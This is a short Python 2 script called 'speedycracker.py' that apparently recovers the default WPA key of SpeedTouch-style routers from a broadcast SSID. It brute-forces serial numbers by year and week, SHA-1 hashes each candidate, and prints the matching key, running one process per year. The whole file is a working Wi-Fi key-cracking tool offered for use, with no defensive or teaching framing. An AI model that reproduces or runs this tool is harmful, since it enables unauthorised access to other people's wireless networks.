#!/usr/bin/env python
#change to python2 or python2.6 if it doesn't work

import sys
import hashlib
from binascii import hexlify, unhexlify
from itertools import product
from multiprocessing import Process

try:
    import psyco
    psyco.full()
except:
    pass


def do_year(year):
    print "Searching year %02d..." % year
    serial_y = "CP%02d" % (year)
    for week in xrange(1, 53):
        serial_w = "%s%02d" % (serial_y, week)
        for xxx in product(hexchars, repeat=3):
            sha = hashlib.sha1(serial_w + "".join(xxx)).hexdigest()
            if sha.endswith(ssid):
                print "  Key found: %s (serial %s). Year 20%02d" % (sha[:10], "CP%02d%02d??%s" % (year, week, unhexlify("".join(xxx))), year)


if len(sys.argv) != 2:
    print "speedycracker.py <SSID>"
    sys.exit(1)

chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
hexchars = map(str.upper, map(hexlify, chars))
ssid = sys.argv[1].lower().strip()

try:
    int(ssid, 16)
except ValueError:
    print "%s is not a valid SSID." % ssid
    sys.exit(1)

q = []
for year in xrange(6,12):
    process = Process(target=do_year, args=(year,))
    process.start()
    q += [process]

print "all available threads are now being used"
for process in q:
    process.join()